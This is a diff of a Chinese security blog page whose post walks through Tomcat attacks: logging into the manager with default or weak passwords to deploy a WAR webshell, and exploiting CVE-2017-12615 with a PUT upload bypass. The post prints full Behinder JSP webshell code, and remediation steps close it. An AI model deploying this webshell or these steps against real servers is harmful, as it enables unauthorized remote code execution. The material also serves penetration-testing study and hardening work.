@@ -17,16 +17,31 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>Erickin的博客</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Erickin">
-<meta property="og:url" content="https://erickinyae.github.io/page/3/index.html">
+  <title>tomcat漏洞 | Erickin的博客</title>
+  <meta name="description" content="tomcat默认账号远程控制1. 资产扫描确认该服务器使用的是tomcat，可通过nmap等资产测绘工具进行扫描； 2.访问tomcat管理界面通过ip:8080端口访问tomcat默认管理界面；  点击Manager App进入管理界面进行登录；  默认用户密码tomcat、tomcat；  在war file deploy栏目中，进行war文件上传；  将behinder中的shell.jsp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tomcat漏洞">
+<meta property="og:url" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Erickin">
+<meta property="og:description" content="tomcat默认账号远程控制1. 资产扫描确认该服务器使用的是tomcat，可通过nmap等资产测绘工具进行扫描； 2.访问tomcat管理界面通过ip:8080端口访问tomcat默认管理界面；  点击Manager App进入管理界面进行登录；  默认用户密码tomcat、tomcat；  在war file deploy栏目中，进行war文件上传；  将behinder中的shell.jsp">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223611141.png">
+<meta property="og:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223708382.png">
+<meta property="og:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223738893.png">
+<meta property="og:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223855995.png">
+<meta property="og:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223942885.png">
+<meta property="og:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317224032661.png">
+<meta property="og:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317224733968.png">
+<meta property="og:image" content="file:///D:/blog/blog/source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF/image-20240318202402767.png?lastModify=1710768988">
+<meta property="og:image" content="file:///D:/blog/blog/source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF/image-20240318202809843.png?lastModify=1710768988">
+<meta property="article:published_time" content="2024-03-18T14:10:49.000Z">
+<meta property="article:modified_time" content="2024-03-18T14:12:47.196Z">
 <meta property="article:author" content="Erickin">
+<meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223611141.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://erickinyae.github.io/page/3/index.html">
+  <link rel="canonical" href="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Erickin" type="application/atom+xml">
   
@@ -281,347 +296,195 @@
 </aside>
 
   
-  <main class="main" role="main">
   
-  <div class="content article-list">
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-tomcat漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
+    <div class="article-header">
+      
+        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/13/Java-Sec-Code/">Java-Sec-Code</a>
+    <h1 class="article-title" itemprop="name">
+      tomcat漏洞
     </h1>
   
 
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
+      
+      <div class="article-meta">
+        <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/13/Java-Sec-Code/" class="article-date">
-	  <time datetime="2023-11-13T07:49:13.000Z" itemprop="datePublished">11月 13</time>
+	<a href="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/" class="article-date">
+	  <time datetime="2024-03-18T14:10:49.000Z" itemprop="datePublished">2024-03-18</time>
 	</a>
 </span>
-    
+        
   <span class="article-category">
     <i class="icon icon-folder"></i>
     <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
   </span>
 
-    
+        
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+	<a class="article-tag-link-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
   </span>
 
 
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/13/Java-Sec-Code/#comments" class="article-comment-link">评论</a></span>
-    
+        
+
+	<span class="article-read hidden-xs">
+    	<i class="icon icon-eye-fill" aria-hidden="true"></i>
+    	<span id="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/" class="leancloud_visitors"  data-flag-title="tomcat漏洞">0</span>
+    </span>
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">评论</a></span>
+        
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 16.2k(字)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1k(字)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 77(分)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 4(分)</span>
 	
 
-  </p>
-</article>
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="tomcat默认账号远程控制"><a href="#tomcat默认账号远程控制" class="headerlink" title="tomcat默认账号远程控制"></a>tomcat默认账号远程控制</h2><h3 id="1-资产扫描"><a href="#1-资产扫描" class="headerlink" title="1. 资产扫描"></a>1. 资产扫描</h3><p>确认该服务器使用的是tomcat，可通过nmap等资产测绘工具进行扫描；</p>
+<h3 id="2-访问tomcat管理界面"><a href="#2-访问tomcat管理界面" class="headerlink" title="2.访问tomcat管理界面"></a>2.访问tomcat管理界面</h3><p>通过ip:8080端口访问tomcat默认管理界面；</p>
+<p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223611141.png" alt="image-20240317223611141"></p>
+<p>点击Manager App进入管理界面进行登录；</p>
+<p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223708382.png" alt="image-20240317223708382"></p>
+<p>默认用户密码tomcat、tomcat；</p>
+<p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223738893.png" alt="image-20240317223738893"></p>
+<p>在war file deploy栏目中，进行war文件上传；</p>
+<p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223855995.png" alt="image-20240317223855995"></p>
+<p>将behinder中的shell.jsp打包成war上传</p>
+<p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317223942885.png" alt="image-20240317223942885"></p>
+<p>上传后可以访问：</p>
+<p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317224032661.png" alt="image-20240317224032661"></p>
+<p>把下面的文件，用以下命令行启动，进入管理界面，然后就可以新增示例，进行远程命令执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>
 
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
-    </h1>
-  
+<p><img src="/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/image-20240317224733968.png" alt="image-20240317224733968"></p>
+<p>默认密码：rebeyond</p>
+<h2 id="tomcat弱口令漏洞识别和分析"><a href="#tomcat弱口令漏洞识别和分析" class="headerlink" title="tomcat弱口令漏洞识别和分析"></a>tomcat弱口令漏洞识别和分析</h2><ul>
+<li>Tomcat管理页面默认端口8080，点击登录未提示403错误说明服务未开启白名单限制，可以进行弱口令尝试。Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下并获取服务器权限。</li>
+</ul>
+<p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318202402767.png?lastModify=1710768988" alt="image-20240318202402767"></p>
+<ul>
+<li><p>Tomcat管理页面默认端口8080，可通过端口扫描探测目标端口情况，找到tomcat页面并进行弱口令登录尝试。常见的弱口令有tomcat&#x2F;tomcat，admin&#x2F;admin，admin&#x2F;123456，root&#x2F;root等。Tomcat支持在后台部署war文件，通过弱口令登录可以直接将webshell部署到web目录下并获取服务器权限。</p>
+</li>
+<li><p>通过tomcat&#x2F;tomcat弱口令登录进行tomcat管理后台。把jsp木马打包为zip压缩包后将后缀修改为.war，上传war包并点击Deploy；</p>
+<p><img src="file://D:\blog\blog\source_posts%E7%BA%A2%E5%86%9B%E6%8A%80%E6%9C%AF\image-20240318202809843.png?lastModify=1710768988" alt="image-20240318202809843"></p>
+</li>
+<li><p>访问页面&#x2F;test&#x2F;test.jsp存在说明部署成功，使用蚁剑连接成功。</p>
+</li>
+</ul>
+<h3 id="弱口令修复方法"><a href="#弱口令修复方法" class="headerlink" title="弱口令修复方法"></a>弱口令修复方法</h3><ul>
+<li>编辑conf目录下的tomcat-users.xml文件，修改账号的密码为强度较高的强密码，如同时包含数字大小写字母且位数大于8位，不得使用一串相同的数字或字母组成，不能键盘连续序列集合；</li>
+<li>Tomcat设置访问白名单，编辑文件&#x2F;webapps&#x2F;manager&#x2F;META-INF&#x2F;context.xml，修改为访问网段的地址或具体的IP；</li>
+</ul>
+<h2 id="CVE-2017-12615远程代码执行漏洞识别和分析"><a href="#CVE-2017-12615远程代码执行漏洞识别和分析" class="headerlink" title="CVE-2017-12615远程代码执行漏洞识别和分析"></a>CVE-2017-12615远程代码执行漏洞识别和分析</h2><ul>
+<li><p>当tomcat运行在windows主机上，且启用了HTTP PUT请求方法（将readonly初始化参数由默认值设置为false），攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的jsp文件，之后，jsp文件中的代码将能被服务器执行。影响版本：Apache Tomcat 7.0.0 - 7.0.79。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">&lt;init-param&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Tomcat管理页面默认端口8080，可通过端口扫描探测目标端口情况，确认目标存在tomcat服务时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件，以此获取目标服务器控制权限。利用条件：运行在windows主机上；启用HTTP PUT请求方法；Tomcat版本在7.0.0-7.0.79，使用::$DATA或%20绕过上传。</p>
+</li>
+<li><p>访问tomcat根目录抓包，修改为POST并手动修改为PUT请求，同时增加请求体：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
 
+<p>使用&#x2F;绕过上传执行成功上传木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT /test2.jsp/ HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 201</span><br></pre></td></tr></table></figure>
+
+<p>即执行成功。</p>
+<h3 id="CVE-2017-12615远程代码执行漏洞修复方法"><a href="#CVE-2017-12615远程代码执行漏洞修复方法" class="headerlink" title="CVE-2017-12615远程代码执行漏洞修复方法"></a>CVE-2017-12615远程代码执行漏洞修复方法</h3></li>
+<li><p>除了升级tomcat版本外还可以将conf&#x2F;web.xml文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数，确保readonly设置为true，即不允许DELETE和PUT操作。</p>
+</li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://erickinyae.github.io/2024/03/18/tomcat%E6%BC%8F%E6%B4%9E/" title="tomcat漏洞" target="_blank" rel="external">https://erickinyae.github.io/2024/03/18/tomcat漏洞/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ErickinYae" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/icon.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ErickinYae" target="_blank"><span class="text-dark">Erickin</span><small class="ml-1x">开发安全，安全开发</small></a></h3>
+        <div>打工人</div>
+      </div>
+    </figure>
   </div>
+</div>
+
+
+    </div>
+  </article>
   
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
-	  <time datetime="2023-11-13T00:51:31.000Z" itemprop="datePublished">11月 13</time>
-	</a>
-</span>
     
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </span>
-
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
     
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
-  </span>
+  </section>
 
 
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#comments" class="article-comment-link">评论</a></span>
-    
-	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 519(字)</span>
-	
-	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 1(分)</span>
-	
-
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/09/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/">安全学习资源</a>
-    </h1>
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
-
-  </div>
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2024/03/18/weblogic%E6%BC%8F%E6%B4%9E/" title="weblogic漏洞"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2024/03/17/tomcat%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/" title="tomcat默认账号远程控制"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
   
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/09/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/" class="article-date">
-	  <time datetime="2023-11-09T05:33:04.000Z" itemprop="datePublished">11月 9</time>
-	</a>
-</span>
-    
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </span>
-
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/09/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/#comments" class="article-comment-link">评论</a></span>
-    
-	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 57(字)</span>
-	
-	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 1(分)</span>
-	
-
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/">代码审计学习路线</a>
-    </h1>
   
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/" class="article-date">
-	  <time datetime="2023-11-09T02:44:56.000Z" itemprop="datePublished">11月 9</time>
-	</a>
-</span>
+  <div class="bar-right">
     
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </span>
-
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/#comments" class="article-comment-link">评论</a></span>
-    
-	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 37(字)</span>
-	
-	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 1(分)</span>
-	
-
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/06/mysql/">mysql</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/06/mysql/" class="article-date">
-	  <time datetime="2023-11-06T02:34:30.000Z" itemprop="datePublished">11月 6</time>
-	</a>
-</span>
-    
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E5%BC%80%E5%8F%91/">开发</a>
-  </span>
-
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/06/mysql/#comments" class="article-comment-link">评论</a></span>
-    
-	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 16.2k(字)</span>
-	
-	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 63(分)</span>
-	
-
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/04/hexo/">hexo</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/04/hexo/" class="article-date">
-	  <time datetime="2023-11-04T15:41:40.000Z" itemprop="datePublished">11月 4</time>
-	</a>
-</span>
-    
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
-  </span>
-
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/04/hexo/#comments" class="article-comment-link">评论</a></span>
-    
-	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 33(字)</span>
-	
-	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 1(分)</span>
-	
-
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/10/21/git/">git</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2023/10/21/git/" class="article-date">
-	  <time datetime="2023-10-21T15:57:30.000Z" itemprop="datePublished">10月 21</time>
-	</a>
-</span>
-    
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E5%BC%80%E5%8F%91/">开发</a>
-  </span>
-
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/CI-CD/" rel="tag">CI\CD</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/10/21/git/#comments" class="article-comment-link">评论</a></span>
-    
-	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 625(字)</span>
-	
-	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 2(分)</span>
-	
-
-  </p>
-</article>
-
+    <div class="share-component" data-sites="weibo,qq,wechat# PC端显示的分享图标" data-mobile-sites="weibo,qq,qzone"></div>
     
   </div>
-
+  </div>
+</nav>
   
-    
-    <nav class="bar bar-footer clearfix" data-stick-bottom>
-        <div class="bar-inner">
-        <ul class="pager pull-left">
-            
-            <li class="prev">
-                <a href="/page/2/">
-                    <i class="icon icon-angle-left"></i>
-                    上一页
-                </a>
-            </li>
-            
-            
-            <li class="next disabled">
-                <a href="javascript:;">
-                    下一页
-                    <i class="icon icon-angle-right"></i>                    
-                </a>
-            </li>
-            
-        </ul>
-            <div class="total-article bar-right">Page 3 of 3</div>
-        </div>
-    </nav>
-    
- 
+
+
 </main>
 
   <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
@@ -768,6 +631,33 @@ $(function() {
 }); 
 </script>
 
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: true,
+    notify: true,
+    appId: 'SUyBw2O3KrfIHPmB9F7wtwKM-gzGzoHsz',
+    appKey: 'GytafoX6e83t5QtTlbX6wwQt',
+    placeholder: '说点什么吧',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
 
 
 
